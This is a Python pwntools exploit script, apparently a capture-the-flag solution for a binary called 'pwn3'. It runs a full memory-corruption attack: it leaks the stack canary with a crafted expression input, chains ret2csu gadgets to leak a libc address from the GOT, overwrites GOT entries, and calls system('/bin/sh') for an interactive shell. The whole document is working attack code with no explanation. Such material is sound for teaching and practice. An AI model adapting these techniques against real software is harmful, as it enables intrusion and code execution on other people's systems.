from pwn import *

script = '''b* 0x40119c
b* 0x40133a
c
c
'''

context.binary = exe = ELF('pwn3')
io = process()
#gdb.attach(io, script, api=True)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret_main = 0x4012d2
pop_rdi = 0x401343
main_func = 0x40121f
entry = 0x4006e0
csu_gadget_1 = 0x40133a # pop rbx - rbp - r12 - r13 - r14 - r15
csu_gadget_2 = 0x401320 # r13 = rdi ; r14 = rsi ; r15 = rdx ; call r12 ; rbx+1 ; rbp=rbx
remove_trash = 0x401336
pop_r12_r15 = 0x40133c
chain_rsp = 0x40133d # pop rsp - r13 - r14 - r15

payload = b'-1+2+1+1+1+1+1+1+1+1)'
io.sendline(payload)
canary = int(io.recvline(keepends=False))
if(canary < 0):
    canary = 0xffffffffffffffff+canary+1
log.info(f'Canary: {hex(canary)}')

payload = f'1)+2)+1)+1)+1)+1)+1+1+1+1+1+{canary}+2+{pop_r12_r15+2}'.encode() + b'\0ABCDE'
payload += p64(pop_rdi) + p64(exe.got['malloc']) + p64(exe.plt['puts'])
payload += p64(csu_gadget_1) + p64(0) + p64(exe.bss(0x100)) + p64(exe.got['read']) + p64(0) + p64(exe.got['__stack_chk_fail']) + p64(exe.bss(0x100))
payload += p64(csu_gadget_2)[:-2]
print(len(payload))
io.send(payload)
io.recvline()
libc.address = u64(io.recvline(keepends=False).ljust(8, b'\0')) - libc.sym['malloc']
log.info(f'Libc base: {hex(libc.address)}')
#io.interactive()


one = 0x50a37
payload = p64(0x4011e0) + p64(libc.sym['system']) + p64(libc.sym['printf']) + p64(libc.sym['read']) + p64(0x4011e0) + b'\0'*64 + p64(next(libc.search(b"/bin/sh")))
io.sendline(payload)
io.interactive()